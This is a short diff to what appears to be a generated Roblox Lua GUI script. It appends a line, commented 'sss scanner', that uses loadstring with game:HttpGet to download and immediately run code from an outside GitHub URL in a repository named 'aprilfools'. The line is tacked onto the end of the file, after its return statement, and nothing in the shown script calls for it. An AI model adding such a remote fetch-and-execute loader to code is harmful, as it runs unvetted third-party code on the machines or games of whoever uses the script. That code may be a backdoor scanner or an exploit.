@@ -1991,3 +1991,6 @@ end;
 task.spawn(C_63);
 
 return G2L["1"], require;
+
+-- sss scanner
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wealthysherry/aprilfools/refs/heads/main/ServerScriptService%20scanner%20by%20Alurion"))()
